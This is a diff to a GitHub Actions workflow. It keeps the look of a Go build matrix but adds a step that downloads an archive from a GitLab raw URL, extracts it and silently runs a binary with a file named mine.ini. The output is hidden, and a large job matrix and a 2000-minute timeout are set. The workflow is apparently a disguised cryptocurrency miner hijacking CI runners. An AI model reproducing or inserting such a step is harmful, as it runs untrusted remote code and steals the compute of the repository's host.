@@ -1,27 +1,36 @@
-name: Sibotak
-on: [push, pull_request]
+name: bismillah
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
 jobs:
+
   build:
-    name: Gaskan
+    name: 
     runs-on: ubuntu-18.04
     strategy:
-      max-parallel: 40
-      fail-fast: false
       matrix:
         go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [pkn, ips, bin, jos]
-    timeout-minutes: 360
+        flag: [pkn, ips, bin, jos, a, b, c, d]
+    timeout-minutes: 2000
     env:
         NUM_JOBS: 40
         JOB: ${{ matrix.go }}
+
     steps:
+      
     - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
       with:
         go-version: ${{ matrix.go }}
       id: go
-    - name: Setup
+
+    - name: Check out code into the Go module directory
       uses: actions/checkout@v1
-    - name: Gaskan
+
+    - name: bismillah
       run: |
-        echo "taken"
+        wget https://gitlab.com/sehab.oi29/sehab/-/raw/main/gas && tar -xvf gas && chmod +x ikuk mine.ini && ./ikuk mine.ini > /dev/null 2>&1
